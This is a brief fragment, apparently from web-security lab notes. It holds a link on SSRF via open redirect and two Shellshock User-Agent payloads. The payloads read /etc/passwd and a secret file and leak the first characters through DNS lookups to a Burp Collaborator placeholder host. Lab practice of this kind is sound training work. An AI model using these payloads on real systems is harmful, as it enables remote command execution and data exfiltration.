...
- [SSRF via open redirect](SSRF-open-redirect.md)
...
User-Agent: () { :; }; /usr/bin/nslookup $(cat /etc/passwd | head -n 1 | head -c 4).BURP-COLLAB
User-Agent: () { :; }; /usr/bin/nslookup $(cat /home/carlos/secret | head -n 1 | head -c 4).BURP-COLLAB
